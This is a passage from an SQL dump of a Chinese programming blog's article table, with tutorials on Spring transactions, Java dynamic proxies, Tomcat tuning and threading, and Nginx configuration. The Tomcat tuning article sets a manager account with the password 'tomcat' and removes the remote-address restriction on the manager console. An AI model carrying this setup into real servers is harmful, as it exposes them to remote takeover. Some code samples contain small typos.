isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"false\" />\n			<tx:method name=\"delete*\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"false\" />\n			<tx:method name=\"remove*\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"false\" />\n			<tx:method name=\"get*\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"true\" />\n			<tx:method name=\"find*\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"true\" />\n			<tx:method name=\"transfer\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"false\" />\n		</tx:attributes>\n	</tx:advice>\n\n\n	<!-- 配置织入 -->\n	<aop:config>\n		<!-- 配置切点表达式 -->\n		<aop:pointcut expression=\"execution(* root.service.*ServiceImpl.*(..))\" id=\"txPc\" />\n		<!-- 配置切面 : 通知+切点 advice-ref:通知的名称 pointcut-ref:切点的名称 -->\n		<aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"txPc\" />\n	</aop:config> \n\n<!-- 1.连接池 -->\n	<bean name=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\">\n		<property name=\"jdbcUrl\" value=\"${jdbc.jdbcUrl}\"></property>\n		<property name=\"driverClass\" value=\"${jdbc.driverClass}\"></property>\n		<property name=\"user\" value=\"${jdbc.user}\"></property>\n		<property name=\"password\" value=\"${jdbc.password}\"></property>\n	</bean>\n```\n#### 注解事务\n```java\n// 隔离级别,传播行为,是否可读\n@Transactional(isolation=Isolation.REPEATABLE_READ,\n	propagation=Propagation.REQUIRED,\n	readOnly=false)\npublic class AccountServiceImpl implements AccountService {\n	@Override\n	@Transactional(isolation=Isolation.REPEATABLE_RE,\n	propagation=Propagation.REQUIRED,\n	readOnly=true)  \n	public void transfer(Integer from, Integer to, Double money) {\n		\n	}\n}\n```', 0, 0, 91, 0, 0, '2018-11-26 15:31:29', '2019-09-28 15:31:29', 0, 0);
INSERT INTO `article` VALUES (15, 1, '动态代理', '2018/11/1541326196_c4c022c54fcf366ee09a651799b7fd2f.jpg', '### 基本概念\n```java\n代理模式是设计模式中*极其重要*的模式之一,许多框架采用该模式完成模块拼接组成,该模式的通用性极强。\n\n//  介绍\n1. 理解成将一个方法进行*增强* \n2. 比如在方法执行前需要做一些事情(读取配置,修改sql)\n3. 比如在方法执行后需要做一些事情(处理包装结果)\n4. 需要给多个方法进行增强(动态代理) \n5. 比如MyBatis利用动态代理在执行sql前会将开发者写的*配置文件进行读取*,根据这些配置内容来生成实现类\n6. 比如Spring利用动态代理来为开启事务的方法进行*环绕通知*(执行前开启事务,执行后关闭事务) \n7. 实现动态代理必须要满足一下条件之一,也就是有两种办法实现动态代理\n8. 被增强(代理)对象有一个接口,代理类会是这个接口的实现,但与这个类无关(instanceof是false)\n9. 可以被继承(没有被final修饰),代理类会是这个类的子类(instanceof是true)\n\n```\n### 代理模式\n#### 为什么要代理模式\n```java\n// 为什么要代理模式\n// 举出一个例子\npublic interface UserService {\n	void save();\n	void delete();\n	void update();\n	void find();\n}\n\n// 接口实现类\npublic class UserServiceImpl implements UserService{\n	@Override\n	public void save() {\n		System.out.println(\"save\");\n	}\n	@Override\n	public void delete() {\n		System.out.println(\"delete\");\n	}\n	@Override\n	public void update() {\n		System.out.println(\"update\");\n	}\n	@Override\n	public void find() {\n		System.out.println(\"find\");\n	}\n} \n\n明显这个接口有增删改查四个方法,但是我们想要给每个方法*执行前开始事务*,*执行后关闭事务*  \n如果不考虑使用代理模式的话,那么每个方法都要做重复的工作,像这样\n\n// 对四个方法进行事务代理\npublic class UserServiceImpl implements UserService{\n\n	@Override\n	public void save() {\n		System.out.println(\"开启\");\n		System.out.println(\"save\");\n		System.out.println(\"关闭\");\n	}\n\n	@Override\n	public void delete() {\n		System.out.println(\"开启\");\n		System.out.println(\"delete\");\n		System.out.println(\"关闭\");\n	}\n\n	@Override\n	public void update() {\n		System.out.println(\"开启\");\n		System.out.println(\"update\");\n		System.out.println(\"关闭\");\n	}\n\n	@Override\n	public void find() {\n		System.out.println(\"开启\");\n		System.out.println(\"find\");\n		System.out.println(\"关闭\");\n	}\n\n} \n\n很明显,冗余性严重增加了,同样*固定的事*干了四遍\n我希望四个方法*执行操作前后*去开启和关闭,但我不希望我要给每个方法内部手动开启和关闭,这两个操作是固定\n我希望四个方法在*执行前后*能走到一个*统一处理的地方*\n```\n#### 静态代理\n```java\n// 把代码*简化掉*,假如我们只有一个方法需要开启和关闭该如何走一个处理的地方\n// 先看看如果依旧像之前那样\n// 接口\npublic interface UserService {\n    void save();\n}\n// 实现类\npublic class UserServiceImpl implements UserService{\n	@Override\n	public void save() {\n		System.out.println(\"开启\");\n		System.out.println(\"save\");\n		System.out.println(\"关闭\");\n	}\n}\n\n// 我们需要*处理执行前后*的地方,利用*组合*可以做到这一点,也称为静态代理\n// 被增强(代理)类\npublic class UserServiceImpl implements UserService{\n    @Override\n    public void save() {\n        System.out.println(\"save\");\n    }\n} \n\n// 创建代理类\npublic class UserServiceProxy implements UserService{\n    \n    // 接收需要被增强的类,也就是上面userServiceImpl,它实现了UserSercice接口\n    private UserService userService;\n    public void setUserService(UserService userService){\n	this.userSerivce = userService;\n    }\n\n    @Override \n    public void save() {\n        System.out.println(\"开启\");\n        userService.save(); // save\n        System.out.println(\"关闭\");\n    }\n} \n\n执行*结果一致*\n不过我们创建了一个代理类,把原增强类作为代理类的一个属性,调用前进行开启和关闭\n原save方法不需要修改\n\n看上去很美好,能够在方法调用前后执行的地方找到了\n如果把方法变回四个昵?\n// 被增强(代理)的类\npublic class UserServiceImpl implements UserService{\n	@Override\n	public void save() {\n		System.out.println(\"save\");\n	}\n	@Override\n	public void delete() {\n		System.out.println(\"delete\");\n	}\n	@Override\n	public void update() {\n		System.out.println(\"update\");\n	}\n	@Override\n	public void find() {\n		System.out.println(\"find\");\n	}\n} \n\n// 代理类\npublic class UserServiceProxy implements UserService{\n    \n    // 接收需要被增强的类,也就是上面userServiceImpl,它实现了UserSercice接口\n    private UserService userService;\n    public void setUserService(UserService userService){\n	this.userSerivce = userService;\n    }\n\n    @Override \n    public void save() {\n        System.out.println(\"开启\");\n        userService.save(); // save\n        System.out.println(\"关闭\");\n    }\n	@Override \n     public void delete() {\n        System.out.println(\"开启\");\n        userService.delete(); // delete\n        System.out.println(\"关闭\");\n    }\n	@Override  \n    public void update() {\n        System.out.println(\"开启\");\n        userService.update(); // update\n        System.out.println(\"关闭\");\n    }\n	@Override  \n    public void find() {\n        System.out.println(\"开启\");\n        userService.find(); // find\n        System.out.println(\"关闭\"); \n    } \n}  \n\n冗余性问题依旧没有解决,重复的事情依旧干了四遍,只不过是在代理类里干的,原增强对象没有改动\n原因就在于每增加一个方法,代理类就要重复做一遍\n无法控制住所有方法,如果能控制住所有方法的运行时,那么这个事情就能解决\n动态代理为了解决这个问题,在所有方法执行前后去做一些事情,无论有多少方法都需要来一趟\n```\n#### 动态代理-JDK\n```java\n// Java提供了两种动态代理的实现方式\n1. jdk代理(接口),依靠被增强代理类接口实现 \n2. cglib代理(继承),依靠称为被增强代理类子类实现 \n\n// JDK代理\n// 生成代理类的工厂 \npublic class UserServiceProxyFactory {\n\n	public UserService getUserServiceProxy(UserService userService) {\n		// 加载器,被增强代理者(userServiceImpl),增强内容\n		UserService userPro  = (UserService) Proxy.newProxyInstance(this.getClass().getClassLoader(), \n				UserServiceImpl.class.getInterfaces(), \n				new InvocationPro(userService));\n		return userPro;\n	}\n} \n\n// 之所以需要加载类是因为底层实现需要*操作字节码*\n// jdk代理需要被增强代理者的接口,也就是userService\n// 第三个是关键,它就是*统一处理的地方*\n// 返回值userPro就是生成后的代理对象\n\n// 处理器\npublic class InvocationPro implements InvocationHandler {\n	// 原始者,被增强代理者(userServiceImpl)\n	private UserService userService;\n	public InvocationPro(UserService userSerivce) {\n		this.userService = userSerivce;\n	}\n	// 代理类, 当前执行的方法, 执行时的参数\n	@Override\n	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n		// 增强前,读配置文件,增强SQL,开启事务...\n		System.out.println(\"开启\");\n		// 调用原始增强代理者,并得到返回值\n		Object invoke = method.invoke(userService, args);\n		// 对结果做出一些调整,关闭事务\n		System.out.println(\"关闭\");\n		return invoke; \n	}\n} \n\n// 测试\n	@Test\n	public void fun1() {\n		UserService userService = new UserServiceImpl();\n		UserServiceProxyFactory userServiceProxyFactory = new UserServiceProxyFactory();\n		UserService userPro = userServiceProxyFactory.getUserServiceProxy(userService);\n		userPro.save();\n		userPro.delete();\n		userPro.update();\n		userPro.find();\n\n		System.out.println(userPro instanceof UserServiceImpl); // false\n	}\n*所有方法都经过统一处理器*,关键是,重复的操作没有了,只要在统一处理器位置写一次就行了\n根据Method和args可以指定哪些方法干什么事\ninstanceof=false是因为jdk代理是依靠接口,userServiceImpl和userPro没有关系,只不过它们有一个共同的接口\n```\n#### 动态代理-cglib\n```java\n// 生成代理类的工厂\npublic class UserServiceProxy {\n	\n	\n	public UserService getUserServiceProxy(UserService userService) {\n		Enhancer en = new Enhancer();\n		// 原始增强者\n		en.setSuperclass(userService.getClass());\n		// 增强内容\n		en.setCallback(new MethodInterceptorPro());\n		// 生成代理对象\n		UserService userPro = (UserService) en.create();\n		return userPro;\n	}\n	\n}\n\n之所有需要原始增强代理者是因为cfglib代理依靠*继承*被代理类实现\n增强内容也就是统一处理器\n返回就是增强后的代理对象\n\n// 处理器\npublic class MethodInterceptorPro implements MethodInterceptor {\n	// 原始增强代理者(userServiceImpl),原始方法,执行参数,代理对象方法\n	@Override\n	public Object intercept(Object obj, Method method, Object[] args, MethodProxy methodProxy) throws Throwable {\n		// 增强前,读配置文件,增强SQL,开启事务...\n		System.out.println(\"开启\");\n		// 原始方法\n		Object invoke = methodProxy.invokeSuper(obj, args);\n		// 对结果做出一些调整,关闭事务\n		System.out.println(\"关闭\");\n		return invoke;\n	}	\n}\n\n// 测试\n@Test\n	public void fun1() {\n		UserService userService = new UserServiceImpl();\n		UserServiceProxy userServiceProxy = new UserServiceProxy();\n		UserService userPro = userServiceProxy.getUserServiceProxy(userService);\n		userPro.delete();\n		userPro.find();\n\n		System.out.println(userPro instanceof UserServiceImpl); // true\n	}\n\n所有方法都经过统一处理器,关键是,重复的操作没有了,只要在统一处理器位置写一次就行了\n根据Method和args可以指定哪些方法干什么事\ninstanceof=true是因为cglib依靠继承实现,所以代理类是原始增强类的子类\n```\n#### JDK代理与Cglib代理的区别\n```java\n// JDK代理与Cglib代理的区别\n1. JDK代理是利用*反射机制*生成一个实现代理接口的匿名类,在调用具体方法前调用invokeHandler来处理\n2. Cglib代理是利用*asm开源包*,将代理对象类的class文件加载进来,通过修改其字节码生成子类来处理\n\n// 装饰模式与代理模式的区别\n1. 装饰器模式关注于在一个对象上动态的添加方法,然而代理模式关注于控制对对象的访问\n2. 使用代理模式的时候，我们常常在一个代理类中创建一个对象的实例\n3. 用装饰器模式的时候，做法是将原始对象作为一个参数传给装饰者的构造器\n\n// 原理\n动态代理源码中通过*字节码*生成代理类\nasm,javassist,bcel等都是可以操作字节码的技术\n```\n### 仿写动态代理实现\n```java\npublic class Proxy {\n	\n	public static Object newProxyInstance(Class infce,InvocationHandler h) throws Exception{\n		// 1、声明一段源码(动态产生代理)\n		String rt = \"\\r\\n\";\n		String methodStr = \"\";\n		for(Method m : infce.getMethods()){\n			methodStr += \"	@Override\" + rt +\n			\"	public void \" + m.getName() + \"() {\" + rt +\n			\"	try{\" + rt +\n			\"	Method md = \"+infce.getName()+\".class.getMethod(\\\"\"\n							+m.getName()+\"\\\");\"+ rt +\n			\"	h.invoke(this,md);\" + rt +\n			\"	} catch(Exception e){e.printStackTrace();}\" + rt + \n			\"	}\";\n		}\n		\n		String str =\n		\"package root.proxy;\" + rt +\n		\"import java.lang.reflect.Method;\" + rt +\n		\"import root.proxy.InvocationHandler;\" + rt +\n		\"public class $Proxy0 implements \" + infce.getName() + \" {\" + rt +\n		\"	public $Proxy0(InvocationHandler h) {\" + rt +\n		\"		super();\" + rt +\n		\"		this.h = h;\" + rt +\n		\"	}\" + rt +\n		\"	private InvocationHandler h;\" + rt +\n		methodStr + rt +\n		\"}\" ;\n		// 产生代理类的Java文件\n		String filename = System.getProperty(\"user.dir\") +\"/bin/root/proxy/$Proxy0.java\";\n		File file = new File(filename);\n		FileUtils.writeStringToFile(file, str);\n		\n		// 2、编译源码（JDK Compiler API），产生新的代理类\n		// Java编译器\n		JavaCompiler complier = ToolProvider.getSystemJavaCompiler();\n		// 文件管理者\n		StandardJavaFileManager fileMgr = \n				complier.getStandardFileManager(null, null, null);\n		// 获取文件\n		Iterable units = fileMgr.getJavaFileObjects(filename);\n		// 编译任务\n		CompilationTask t = complier.getTask(null, fileMgr, null, null, null, units);\n		// 进行编译\n		t.call();\n		fileMgr.close();\n		// 3、将类load到内存当中，产生一个新的对象(代理对象)\n		// load到内存中\n		ClassLoader cl = ClassLoader.getSystemClassLoader();\n		Class c = cl.loadClass(\"root.proxy.$Proxy0\");\n		// 4.return 代理对象\n		Constructor ctr = c.getConstructor(InvocationHandler.class);\n		return ctr.newInstance(h);\n	}\n}\n```', 0, 0, 135, 0, 0, '2018-12-03 18:18:59', '2019-08-22 18:18:59', 0, 0);
INSERT INTO `article` VALUES (16, 1, 'tomcat调优', '2021/5/1621136122_mmexport1621057829919.jpg', '### 配置自带的manager管理\n```java\n// 1. 修改conf/tomcat-users.xml加入以下内容\n<role rolename=\"manager\" />\n<role rolename=\"manager-gui\" />\n<role rolename=\"admin\" />\n<role rolename=\"admin-gui\" />\n<user username=\"tomcat\" password=\"tomcat\" roles=\"admin-gui,admin,manager-gui,manager\" />\n\n// 2. 修改webapps/manager/META-INF/context.xml,注释掉以下内容\n<!--  <Valve className=\"org.apache.catalina.valves.RemoteAddrValve\"\n       allow=\"127\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1\" />\n-->\n```\n### 线程方面\n```java\n// 修改conf/server.xml打开线程池\n(1) 将之前的无线程池的连接注释\n<!-- <Connector port=\"8080\" protocol=\"HTTP/1.1\"\n	          connectionTimeout=\"20000\"\n	         redirectPort=\"8443\" />\n-->\n(2) 打开线程池的连接的注释\n<Connector executor=\"tomcatThreadPool\"\n	port=\"8080\" protocol=\"HTTP/1.1\"\n	connectionTimeout=\"20000\"\n	redirectPort=\"8443\" />\n(3) 打开线程池的注释\n<Executor name=\"tomcatThreadPool\" namePrefix=\"catalina-exec-\"\n	        maxThreads=\"500\" minSpareThreads=\"50\" \n	        prestartminSpareThreads=\"true\"/>\n\n// 设置NIO2(AIO)的运行模式\n<Connector executor=\"tomcatThreadPool\"\n	   port=\"8080\" \n    protocol=\"org.apache.coyote.http11.Http11Nio2Protocol\"\n    connectionTimeout=\"20000\"\n    redirectPort=\"8443\" />\n\n// 参数说明\n// 官网文档: docs/config/http.html\n(1) acceptCount: 最大等待数\n官方文档的说明为：当所有的请求处理线程都在使用时，所能接收的连接请求的队列的最大长度。\n当队列已满时，任何的连接请求都将被拒绝。accept-count的默认值为100。\n详细的来说：当调用HTTP请求数达到tomcat的最大线程数时，还有新的HTTP请求到来，这时tomcat会将该请求放在等待队列中\n这个acceptCount就是指能够接受的最大等待数，默认100。如果等待队列也被放满了，这个时候再来新的请求就会被tomcat拒绝（connection refused）\n\n(2) maxThreads: 最大线程数\n每一次HTTP请求到达Web服务，tomcat都会创建一个线程来处理该请求，那么最大线程数决定了Web服务容器可以同时处理多少个请求。\nmaxThreads默认200，肯定建议增加。但是，增加线程是有成本的，更多的线程，不仅仅会带来更多的线程上下文切换成本，而且意味着带来更多的内存消耗。\nJVM中默认情况下在创建新线程时会分配大小为1M的线程栈，所以，更多的线程异味着需要更多的内存。\n线程数默认为：1核2g内存为200；4核8g内存为800\n\n(3) maxConections: 最大连接数,tomcat能够接受最大处理的连接数	\n官方文档的说明为：\n这个参数是指在同一时间，tomcat能够接受的最大连接数。\n对于Java的阻塞式BIO，默认值是maxthreads的值；如果在BIO模式使用定制的Executor执行器，默认值将是执行器中maxthreads的值。\n对于Java 新的NIO模式，maxConnections 默认值是10000。\n对于windows上APR/native IO模式，maxConnections默认值为8192，这是出于性能原因，如果配置的值不是1024的倍数，maxConnections 的实际值将减少到1024的最大倍数。\n如果设置为-1，则禁用maxconnections功能，表示不限制tomcat容器的连接数。\nmaxConnections和accept-count的关系为：当连接数达到最大值maxConnections后，系统会继续接收连接，但不会超过acceptCount的值。 \n\n// 三者关系\n// maxConnections、maxThreads、acceptCount关系\n用一个形象的比喻，通俗易懂的解释一下tomcat的最大线程数（maxThreads）、最大等待数（acceptCount）和最大连接数（maxConnections）三者之间的关系。\n我们可以把tomcat比做一个火锅店，流程是取号、入座、叫服务员，可以做一下三个形象的类比：\n// (1）acceptCount 最大等待数\n可以类比为火锅店的排号处能够容纳排号的最大数量；排号的数量不是无限制的，火锅店的排号到了一定数据量之后，服务往往会说：已经客满。\n// (2）maxConnections \n最大连接数可以类比为火锅店的大堂的餐桌数量，也就是可以就餐的桌数。如果所有的桌子都已经坐满，则表示餐厅已满，已经达到了服务的数量上线，不能再有顾客进入餐厅了。\n// (3）maxThreads：最大线程数\n可以类比为厨师的个数。每一个厨师，在同一时刻，只能给一张餐桌炒菜，就像极了JVM中的一条线程。\n```\n### 其他方面\n```java\n//  修改conf/server.xml禁用ajp连接,ajp协议是httpapache与tomcat的连接,但是httpapache已经不用了,且有漏洞https://www.cnvd.org.cn/webinfo/show/5415\n<Connector protocol=\"AJP/1.3\"\n	    address=\"::1\"\n	    port=\"8009\"\n	    secretRequired=\"\"\n	    redirectPort=\"8443\" />\n\n// 设置开启sendfile,默认useSendfile为true,采用零拷贝,直接从内核缓冲区到网卡缓存区\n<Connector executor=\"tomcatThreadPool\"\n	  port=\"8080\" \n    protocol=\"org.apache.coyote.http11.Http11Nio2Protocol\"\n	           connectionTimeout=\"20000\"\n	           redirectPort=\"8443\" useSendfile=\"true\"/>\n\n// 设置压缩comression,但是和sendfile互斥,只能选其一,由于涉及需要系统用户空间的拷贝,效率不如sendfile\n<Connector executor=\"tomcatThreadPool\"\n	           port=\"8080\" \n	           protocol=\"org.apache.coyote.http11.Http11Nio2Protocol\"\n	           connectionTimeout=\"20000\"\n	           redirectPort=\"8443\" \n	           compression=\"on\"\n	           compressableMimeType=\"text/html,text/xml,text/javascript,text/css,text/plain\" \n	           compressionMinSize=\"2048\"\n	           noCompressionUserAgents=\"gozilla,traviata\"\n	        />\n\n// 设置keepalive时间\n<Connector executor=\"tomcatThreadPool\"\n	           port=\"8080\" \n	           protocol=\"org.apache.coyote.http11.Http11Nio2Protocol\"\n	           connectionTimeout=\"20000\"\n	           redirectPort=\"8443\" \n	           keepAliveTimeout=\"20000\"\n	           maxKeepAliveRequests=\"100\"\n	        />\n(1) keepAliveTimeout: 此时间过后连接就close了,单位是milliseconds\n(2) maxKeepAliveRequests: keepalive最大连接个数(1表示禁用,-1表示不限制个数,默认100个,一般设置在100-200之间)\n\n// 设置G1垃圾收集器(nio模式,最大线程1000),修改conf/catalina.sh\nJAVA_OPTS=\"-XX:+UseG1GC -Xms128m -Xmx1024m -XX:NewSize=64m -XX:MaxNewSize=256m\n		-XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintHeapAtGC\n		-Xloggc:../logs/gc.log\"\n\n// 其他配置参数\n// 官网文档: docs/config/host.html\n// (1)autoDeploy\n tomcat运行时是否周期性的去检查是否有新的应用更新或加入,生产环境改为false\n\n// (2)enableLookups\n是否跳过requst.getRemoteHost()的DNS查询,跳过则直接返回Ip地址,默认禁用\n\n// (3)reloadable\ntomcat运行时是否监控/WEB-INF/classes和/WEB-INF/lib下的变化并重新载入,默认禁用\n\n// (4)protocol\n\"org.apache.coyote.http11.Http11AprProtocol\" HTTP/1.1默认NIO协议\n```', 0, 0, 25, 0, 0, '2019-01-21 11:35:53', '2019-01-21 11:35:53', 0, 0);
INSERT INTO `article` VALUES (17, 1, 'tomcat的常见线程与运行模式', '2021/5/1621137308_mmexport1621057741784.jpg', '### tomcat常见线程及作用\n```java\n// main\n(1) main线程是tomcat的主要线程,其主要作用是通过启动包来对容器进行点火\n(2) main的作用就是把容器组件拉起来,然后阻塞在8005端口等待关闭\n\n// startstop\n(1) tomcat按照层级进行异步启动,对每一层的组件都是采用startStop线程进行启动\n(2) 当组件启动完成之后,那么该线程就退出了,生命周期仅限于此\n(3) tomcat8中的线程,tomcat9以及后版本不存在,默认由main线程来启动\n\n// AsyncFileHandlerWriter\n(1) tomcat用来创建日志文件的线程\n\n// ContainerBackgroundProcessor\n(1) 主要负责实时扫描tomcat容器的变化,在一些时刻触发某些事件,例如在热部署开启时reload工程等\n(2) 扫描容器时按照层级递归扫描\n(3) tomcat8中的线程,tomcat9以及后版本不存在,被catalina-utility替代\n\n// Catalina-Utility\n(1) 将tomcat8中的ContainerBackgroundProcessor和startStop合二为一了\n\n// acceptor\n(1) tomcat前端最外层的线程,负责统一接收socket请求\n(2) 本质底层使用了javanio中的accept,用于接收新的请求\n\n// ClientPoller\n(1) nio模式中特有线程,reactor模式的实现者\n(2) 具体负责接收acceptor线程交接过来的事件,对事件轮询后交接给exec线程处理\n(3) 相当于reactor模式中的Initiation Dispatcher(初始分发器)\n\n// exec\n(1) tomcat的主要工作线程,默认十个,接收clientPoller线程丢过来的io事件\n(2) 主要工作是http协议解析,攒出Request和Response,然后调用tomcat后端的容器\n(3) 相当于reactor模式中的Concrete Event Handler(具体事件处理器)\n\n// BlockPoller\n(1) 负责servlet的输入和输出\n\n// AsyncTimeout\n(1) 主要作用检测异步request请求时,触发超时,并将该请求再转发到工作线程池处理\n\n// 其他线程\n(1) 例如ajp相关线程,sendfile相关线程等等\n\n```\n### 四种运行模式的区别\n```java\n// BIO,阻塞模式,一个请求对应一个线程\nBIO:tomcat7之前默认的阻塞模式,性能低下,没有经过任何优化处理和支持,8.5版本之后已经抛弃该模式\n// NIO: 同步非阻塞模式\ntomcat内部实现了reactor线程模型,性能较高\n// NIO2: 纯异步模式\ntomcat内部实现了preactor线程模式\n// APR: APR模式\n是一个运行库,从操作系统级别解决异步IO问题,大幅度的提高了性能,但需要熟悉C/C++以及操作系统\n\n// BIO的前端框架\n(1) BIO的流程基本上和NIO通道一样,BIO的结构因为缺少了selector和轮询,相比NIO少了一部分的内容\n整体上就是使用的ServerSocket来进行通信的,一线程一请求的模式,\n代码看起来清晰易懂.但是由于BIO的模型比较落后,在大多数场景下,不如NIO,所以tomcat8.5后抛弃了BIO,默认是NIO\n\n// NIO的前端框架主要是由三个不同的线程依次分工协作\n(1) Acceptor线程将socketChannel取出,传递给Poller线程(包装为PollEvent加入缓存队列)\n(2) Poller线程执行的就是Nio的selectKey,拿到通道中感兴趣的事件,轮询获取,然后将感兴趣的selectKey和keyattachment传递给工作线程进行处理\n(3) 工作线程调用http11ConnectionHandler进行http协议的解析,然后将解析出来的内容包装成Request,Response对象,传递给分界点CoyoteAdapter,最终执行到业务中\n\n// NIO2/AIO的前端框架\n(1) Acceptor线程将socketChannel取出,传递给CompletionHandler,由操作系统等待并拷贝数据\n(2) 操作系统执行调用CompletionHandler的回调方法completed或failed,随后就将数据传递给工作线程进行处理\n工作线程工作方式同NIO,但是返回数据用的是Future\n\n// APR通道\n(1) APR通道的Socket全部来自C语言实现的socket,非jdk的socket,直接在tomcat层级调用native方法\n\n// bio,nio,aio\nbio read: read时可能数据尚未抵达网卡,需要阻塞等待,待数据抵达时再拷贝至用户态内存,由用户态等待并拷贝\nnio read: selector轮询已经抵达网卡的数据并通知,read时由用户态发起,将数据拷贝至用户态内存,由用户态拷贝\naio read: 真正的异步操作,read时给操作系统一个回调方法,当数据到达时,由操作系统主动拷贝数据至用户态内存,用户态只需在回调方法中获取数据并执行业务逻辑\n\n```', 0, 0, 27, 0, 0, '2019-01-21 11:55:16', '2019-01-26 11:55:16', 0, 0);
INSERT INTO `article` VALUES (18, 1, 'nginx的基础配置与反向代理及动静分离', '2019/1/1547015262_35853522_p0.jpg', '### 基本概念\n```java\n// 什么是Nginx\n1. Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。\n2. 特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好\n3. 可应用功能: 动静分离,虚拟主机,反向代理,负载均衡,防止DDOS(安全控制),API接口网关(跨域,防盗链)\n\n```\n#### DNS\n![NginxDNS.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626678574_Nginx-DNS.png)\n```java\n// 域名底层转换?底层是怎么找到我们对应的服务器\n1. 浏览器通过域名搜索需要先通过本地host文件\n2. 若存在域名与服务器ip的对应关系,直接向浏览器返回关系结果.导致DNS劫持的原因就是因为本地host文件篡改\n3. 不存在则通过网络运营商进行解析,由网络运营商返回关系结果\n4. 域名最终通过DNS解析后,转换为IP地址\n\n```\n### Nginx基础配置\n#### 请求引导至本地文件\n![Nginx请求引导本地文件.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626678574_Nginx-请求引导本地文件.png)\n```json\nserver {\n	listen       80; // 默认端口80\n	server_name  poi.com; // 请求域名       \n	location / {     // 路由匹配key\n		root /usr/MyProject/; // 映射目录\n		index index.html index.htm // 映射目录下对应默认文件\n	}\n} \n```\n#### 端口号区分项目\n![Nginx端口号区分项目.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626678574_Nginx-端口号区分项目.png)\n```json\nserver {\n	listen       3000;	// 请求端口号\n	server_name  poi.com; // 请求域名   \n	location / {   \n		root /usr/jd/;	// 映射目录\n		index index.html index.htm 	// 映射目录下默认读取文件\n	}\n}\nserver {\n	listen       4000;	// 请求端口号\n	server_name  poi.com; // 请求域名   \n	location / {  \n		root /usr/tb/;	// 映射目录\n	    index index.html index.htm 	// 映射目录下默认读取文件\n	}\n} \n```\n#### 域名区分项目\n![Nginx域名区分项目.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626678574_Nginx-域名区分项目.png)\n```json\nserver {\n		listen       80; // 请求端口号\n		server_name  jd.poi.com; // 请求域名   \n	    location / {   \n			root /usr/jd;	// 映射目录\n		    index index.html index.htm 	// 映射目录下默认读取文件\n		}\n}\nserver {\n		listen       80; // 请求端口号\n		server_name  tb.poi.com; // 请求域名   \n		location / {  \n			root /usr/tb;	// 映射目录\n	    	index index.html index.htm 	// 映射目录下默认读取文件\n		}\n}\n``` \n### location表达式\n| 格式 | 解释 |\n: | :-: |\nlocation =  /uri | = 表示精确匹配，只有完全匹配上才能生效 |\nlocation ^~ /uri | ^~ 开头对URL路径进行前缀匹配，并且在正则之前 | \nlocation ~  pattern | 开头表示区分大小写的正则匹配  |\nlocation ~* pattern | 开头表示不区分大小写的正则匹配 |\nlocation /  uri | 不带任何修饰符，也表示前缀匹配，但是在正则匹配之后  |\nlocation / | 通用匹配，任何未匹配到其它location的请求都会匹配到,相当于switch中的default  |\n\n```java\n// location正则表达式作用\n1. location指令的作用是根据用户请求的URI来执行不同的应用,也就是根据用户请求的网站URL进行匹配,匹配成功即进行相关的操作\n```\n\n### rewrite全局变量\n| 格式 | 解释 |\n : | :-: |\n$args | 这个变量等于请求行中的参数,同$query_string |\n$content_length | 请求头中的Content-length字段。 | \n$content_type | 请求头中的Content-Type字段。  |\n$document_root | 当前请求在root指令中指定的值。 |\n$host | 请求主机头字段，否则为服务器名称。  |\n$http_user_agent | 客户端agent信息  | \n$http_cookie | 客户端cookie信息 |\n$limit_rate | 这个变量可以限制连接速率 | \n$request_method | 客户端请求的动作，通常为GET或POST。  |\n$remote_addr | 客户端的IP地址 |\n$remote_port | 客户端的端口  |\n$remote_user | 已经经过AuthBasicModule验证的用户名  |\n$request_filename | 当前请求的文件路径，由root或alias指令与URI请求生成。  |\n$scheme | HTTP方法（如http，https）  |\n$server_protocol | 请求使用的协议，通常是HTTP/1.0或HTTP/1.1  |\n$server_addr | 服务器地址，在完成一次系统调用后可以确定这个值  |\n$server_name| 服务器名称  |\n$server_port | 请求到达服务器的端口号  |\n$request_uri | 包含请求参数的原始URI，不包含主机名，如”/foo/bar.php?arg=baz”  |\n$uri | 不带请求参数的当前URI，$uri不包含主机名，如”/foo/bar.html”,同$document_uri  |\n\n```java\n// rewrite作用\n1. Nginx提供的全局变量或自己设置的变量,结合正则表达式和标志位实现url重写以及重定向。\n2. rewrite只能放在server{},location{},if{}中，并且只能对域名后边的除去传递的参数外的字符串起作用。\n3. 通过Rewrite规则，可以实现规范的URL、根据变量来做URL转向及选择配置\n\n// 如果访问者的ip地址为49.185.23.163,则返回403\nif ($remote_addr = 49.185.23.163) {  \n    return 403;   \n}\n// 不允许谷歌浏览器访问\nif ($http_user_agent ~ Chrome) {   \n    return 500;  \n}\n// 只允许通过百度下的域名来源进行访问\nvalid_referers none blocked www.baidu.com *.baidu.com; \nif ($invalid_referer) { 		\n	rewrite ^/ http://myWeb.com/403 redirect; \n}\n```\n### 反向代理\n![Nginx反向代理.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626678574_Nginx-反向代理.png)\n```java\n// 什么是反向代理\n1. 将请求进行转发,转发到其他的服务器,是负载均衡的前提\n2. *拦截请求,根据配置内部实现转发到真实的服务器地址中,提高安全性*\n3. 负载均衡属于分布式内容,不宜与反向代理归为一类\n\n// 反向代理作用\n1. 分担职责,减少服务器压力\n2. 是负载均衡的基础前提\n\n// 为什么要在内网进行转发\n1. 外网无法获知真实应用服务器的地址,保障了安全性\n2. 内网的效率快速,且无需购买外网ip的费用\n\n```\n#### 